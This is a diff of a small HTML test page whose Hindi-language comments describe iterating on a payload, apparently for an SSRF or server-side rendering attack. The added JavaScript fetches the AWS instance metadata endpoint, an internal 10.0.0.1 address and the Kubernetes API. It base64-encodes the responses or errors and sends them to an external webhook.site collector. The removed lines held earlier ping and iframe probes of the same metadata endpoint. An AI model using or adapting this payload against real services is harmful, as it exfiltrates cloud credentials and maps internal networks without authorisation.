@@ -1,19 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Test Page</h1>
 
-<!-- Image tag se ping — no CORS issue -->
+<!-- Ye pehle se kaam kar raha hai: -->
 <img src="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?visit=1" width="1" height="1">
 
-<!-- Iframe test -->
-<iframe src="http://169.254.169.254/latest/meta-data/" width="1" height="1"></iframe>
+<!-- Ab JS test karo: -->
+<script>
+// Simple ping - JS chala ya nahi
+var h = 'https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c';
 
-<!-- Link tags -->
-<link rel="stylesheet" href="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?css=1">
+// Test 1 - Basic JS
+fetch(h + '?js=executed');
 
-<!-- Script tag -->
-<script src="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?js=1"></script>
+// Test 2 - AWS Metadata
+fetch('http://169.254.169.254/latest/meta-data/')
+  .then(r => r.text())
+  .then(d => fetch(h + '?aws=' + btoa(d)))
+  .catch(e => fetch(h + '?aws_blocked=' + btoa(e.toString())));
+
+// Test 3 - Internal network
+fetch('http://10.0.0.1/')
+  .catch(e => fetch(h + '?internal=blocked'));
+
+// Test 4 - K8s
+fetch('http://kubernetes.default.svc/')
+  .then(r => r.text())
+  .then(d => fetch(h + '?k8s=' + btoa(d)))
+  .catch(e => fetch(h + '?k8s_blocked=true'));
+</script>
 
 </body>
 </html>
